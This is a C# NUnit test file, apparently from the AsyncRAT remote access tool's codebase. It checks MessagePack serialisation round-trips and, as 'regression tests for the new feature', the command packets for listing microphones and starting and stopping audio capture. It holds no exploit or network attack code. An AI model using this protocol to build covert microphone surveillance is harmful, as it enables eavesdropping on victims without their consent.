using MessagePackLib.MessagePack;
using NUnit.Framework;

namespace AsyncRAT.Tests.MessagePack
{
    [TestFixture]
    public class MsgPackTests
    {
        // ──────────────────────────────────────────────────────────────────────
        // Basic encode / decode round-trips
        // ──────────────────────────────────────────────────────────────────────

        [Test]
        public void EncodeDecodeString_RoundTrip()
        {
            var pack = new MsgPack();
            pack.ForcePathObject("key").AsString = "value";

            byte[] bytes = pack.Encode2Bytes();

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(bytes);

            Assert.That(unpack.ForcePathObject("key").AsString, Is.EqualTo("value"));
        }

        [Test]
        public void EncodeDecodeInteger_RoundTrip()
        {
            var pack = new MsgPack();
            pack.ForcePathObject("num").AsInteger = 12345678;

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(pack.Encode2Bytes());

            Assert.That(unpack.ForcePathObject("num").AsInteger, Is.EqualTo(12345678));
        }

        [Test]
        public void EncodeDecodeNegativeInteger_RoundTrip()
        {
            var pack = new MsgPack();
            pack.ForcePathObject("neg").AsInteger = -42;

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(pack.Encode2Bytes());

            Assert.That(unpack.ForcePathObject("neg").AsInteger, Is.EqualTo(-42));
        }

        [Test]
        public void EncodeDecodeFloat_RoundTrip()
        {
            var pack = new MsgPack();
            pack.ForcePathObject("float").SetAsFloat(3.14);

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(pack.Encode2Bytes());

            Assert.That(unpack.ForcePathObject("float").AsFloat, Is.EqualTo(3.14).Within(0.0001));
        }

        [Test]
        public void EncodeDecodeBytes_RoundTrip()
        {
            byte[] original = new byte[] { 0x01, 0x02, 0xFE, 0xFF };
            var pack = new MsgPack();
            pack.ForcePathObject("bin").SetAsBytes(original);

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(pack.Encode2Bytes());

            Assert.That(unpack.ForcePathObject("bin").GetAsBytes(), Is.EqualTo(original));
        }

        [Test]
        public void EncodeDecodeNull_RoundTrip()
        {
            var pack = new MsgPack();
            pack.ForcePathObject("nil").SetAsNull();

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(pack.Encode2Bytes());

            Assert.That(unpack.ForcePathObject("nil").ValueType, Is.EqualTo(MsgPackType.Null));
        }

        [Test]
        public void EncodeDecodeBool_True_RoundTrip()
        {
            var pack = new MsgPack();
            pack.ForcePathObject("flag").SetAsBoolean(true);

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(pack.Encode2Bytes());

            Assert.That(unpack.ForcePathObject("flag").ValueType, Is.EqualTo(MsgPackType.Boolean));
            Assert.That(unpack.ForcePathObject("flag").AsString, Is.EqualTo("True"));
        }

        [Test]
        public void EncodeDecodeBool_False_RoundTrip()
        {
            var pack = new MsgPack();
            pack.ForcePathObject("flag").SetAsBoolean(false);

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(pack.Encode2Bytes());

            Assert.That(unpack.ForcePathObject("flag").ValueType, Is.EqualTo(MsgPackType.Boolean));
            Assert.That(unpack.ForcePathObject("flag").AsString, Is.EqualTo("False"));
        }

        // ──────────────────────────────────────────────────────────────────────
        // Multiple fields
        // ──────────────────────────────────────────────────────────────────────

        [Test]
        public void MultipleFields_EncodeDecodeAll()
        {
            var pack = new MsgPack();
            pack.ForcePathObject("Packet").AsString = "microphone";
            pack.ForcePathObject("Command").AsString = "capture";
            pack.ForcePathObject("DeviceIndex").AsInteger = 0;
            pack.ForcePathObject("Hwid").AsString = "AABBCCDDEEFF";

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(pack.Encode2Bytes());

            Assert.That(unpack.ForcePathObject("Packet").AsString, Is.EqualTo("microphone"));
            Assert.That(unpack.ForcePathObject("Command").AsString, Is.EqualTo("capture"));
            Assert.That(unpack.ForcePathObject("DeviceIndex").AsInteger, Is.EqualTo(0));
            Assert.That(unpack.ForcePathObject("Hwid").AsString, Is.EqualTo("AABBCCDDEEFF"));
        }

        // ──────────────────────────────────────────────────────────────────────
        // Microphone packet shapes (regression tests for the new feature)
        // ──────────────────────────────────────────────────────────────────────

        [Test]
        public void MicrophoneGetMicrophonesPacket_EncodesAndDecodes()
        {
            var pack = new MsgPack();
            pack.ForcePathObject("Packet").AsString = "microphone";
            pack.ForcePathObject("Command").AsString = "getMicrophones";
            pack.ForcePathObject("Hwid").AsString = "HWID001";
            pack.ForcePathObject("List").AsString = "Microphone (Realtek)->|Default Mic->|";

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(pack.Encode2Bytes());

            Assert.That(unpack.ForcePathObject("Packet").AsString, Is.EqualTo("microphone"));
            Assert.That(unpack.ForcePathObject("Command").AsString, Is.EqualTo("getMicrophones"));
            Assert.That(unpack.ForcePathObject("List").AsString, Does.Contain("->|"));
        }

        [Test]
        public void MicrophoneCapturePacket_WithAudioData_EncodesAndDecodes()
        {
            byte[] fakeAudio = new byte[3200]; // 100ms of 16kHz 16-bit mono
            for (int i = 0; i < fakeAudio.Length; i++)
                fakeAudio[i] = (byte)(i % 256);

            var pack = new MsgPack();
            pack.ForcePathObject("Packet").AsString = "microphone";
            pack.ForcePathObject("Command").AsString = "capture";
            pack.ForcePathObject("Hwid").AsString = "HWID001";
            pack.ForcePathObject("Data").SetAsBytes(fakeAudio);

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(pack.Encode2Bytes());

            Assert.That(unpack.ForcePathObject("Packet").AsString, Is.EqualTo("microphone"));
            Assert.That(unpack.ForcePathObject("Data").GetAsBytes(), Is.EqualTo(fakeAudio));
        }

        [Test]
        public void MicrophoneStartCaptureCommand_EncodesDeviceIndex()
        {
            var pack = new MsgPack();
            pack.ForcePathObject("Packet").AsString = "microphone";
            pack.ForcePathObject("Command").AsString = "capture";
            pack.ForcePathObject("DeviceIndex").AsInteger = 2;

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(pack.Encode2Bytes());

            Assert.That(unpack.ForcePathObject("DeviceIndex").AsInteger, Is.EqualTo(2));
        }

        [Test]
        public void MicrophoneStopCommand_EncodesAndDecodes()
        {
            var pack = new MsgPack();
            pack.ForcePathObject("Packet").AsString = "microphone";
            pack.ForcePathObject("Command").AsString = "stop";

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(pack.Encode2Bytes());

            Assert.That(unpack.ForcePathObject("Command").AsString, Is.EqualTo("stop"));
        }

        // ──────────────────────────────────────────────────────────────────────
        // ForcePathObject / FindObject
        // ──────────────────────────────────────────────────────────────────────

        [Test]
        public void ForcePathObject_NonExistentKey_CreatesKey()
        {
            var pack = new MsgPack();
            var child = pack.ForcePathObject("newkey");
            Assert.That(child, Is.Not.Null);
        }

        [Test]
        public void FindObject_ExistingKey_ReturnsObject()
        {
            var pack = new MsgPack();
            pack.ForcePathObject("existing").AsString = "present";
            Assert.That(pack.FindObject("existing"), Is.Not.Null);
        }

        [Test]
        public void FindObject_NonExistentKey_ReturnsNull()
        {
            var pack = new MsgPack();
            Assert.That(pack.FindObject("missing"), Is.Null);
        }

        [Test]
        public void FindObject_KeyIsCaseInsensitive()
        {
            var pack = new MsgPack();
            pack.ForcePathObject("MyKey").AsString = "val";
            Assert.That(pack.FindObject("mykey"), Is.Not.Null);
            Assert.That(pack.FindObject("MYKEY"), Is.Not.Null);
        }

        // ──────────────────────────────────────────────────────────────────────
        // Array support
        // ──────────────────────────────────────────────────────────────────────

        [Test]
        public void Array_AddAndRetrieve()
        {
            var pack = new MsgPack();
            var arr = pack.ForcePathObject("items").AsArray;
            arr.Add("first");
            arr.Add("second");

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(pack.Encode2Bytes());

            var arrOut = unpack.ForcePathObject("items").AsArray;
            Assert.That(arrOut.Length, Is.EqualTo(2));
            Assert.That(arrOut[0].AsString, Is.EqualTo("first"));
            Assert.That(arrOut[1].AsString, Is.EqualTo("second"));
        }

        [Test]
        public void EmptyMsgPack_EncodesAndDecodes()
        {
            var pack = new MsgPack();
            byte[] bytes = pack.Encode2Bytes();
            Assert.That(bytes, Is.Not.Null);
            Assert.That(bytes.Length, Is.GreaterThan(0));
        }

        [Test]
        public void LargeBinaryPayload_EncodesAndDecodes()
        {
            byte[] payload = new byte[65536];
            new System.Random(7).NextBytes(payload);

            var pack = new MsgPack();
            pack.ForcePathObject("Packet").AsString = "microphone";
            pack.ForcePathObject("Data").SetAsBytes(payload);

            var unpack = new MsgPack();
            unpack.DecodeFromBytes(pack.Encode2Bytes());

            Assert.That(unpack.ForcePathObject("Data").GetAsBytes(), Is.EqualTo(payload));
        }
    }
}
